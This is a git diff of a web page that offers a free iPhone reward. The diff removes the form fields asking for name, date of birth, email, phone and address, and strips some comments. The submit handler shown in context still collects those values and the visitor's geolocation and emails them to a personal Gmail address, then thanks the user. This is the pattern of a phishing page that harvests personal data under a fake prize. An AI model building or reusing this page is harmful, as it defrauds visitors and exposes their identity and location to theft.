@@ -17,28 +17,7 @@
         <p class="form-text">Please fill out the form below to claim your reward.</p>
 
         <form id="rewardForm">
-            <!-- Form fields -->
-            <label for="fullName">Full Name:</label>
-            <input type="text" id="fullName" class="form-control" required><br>
-            
-            <label for="dob">Date of Birth:</label>
-            <input type="date" id="dob" class="form-control" required><br>
-            
-            <label for="email">Email:</label>
-            <input type="email" id="email" class="form-control" required><br>
-            
-            <label for="phoneNumber">Phone Number:</label>
-            <input type="tel" id="phoneNumber" class="form-control" required><br>
-            
-            <label for="address">Address:</label>
-            <input type="text" id="address" class="form-control" required><br>
-            
-            <label for="city">City:</label>
-            <input type="text" id="city" class="form-control" required><br>
-            
-            <label for="postalCode">Postal Code:</label>
-            <input type="text" id="postalCode" class="form-control" required><br>
-
+            <!-- Your form fields here -->
             <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
@@ -79,7 +58,6 @@
         document.getElementById("rewardForm").addEventListener("submit", function (e) {
             e.preventDefault();
 
-            // Get form data
             const formData = {
                 fullName: document.getElementById("fullName").value,
                 dob: document.getElementById("dob").value,
@@ -91,7 +69,6 @@
                 location: `Latitude: ${latitude}, Longitude: ${longitude}`
             };
 
-            // Build the email message
             const message = `
                 Name: ${formData.fullName}
                 Date of Birth: ${formData.dob}
@@ -103,7 +80,6 @@
                 Location: ${formData.location}
             `;
 
-            // Send the email with the form data
             sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
             alert("Thank you for your submission! We will contact you shortly.");
         });
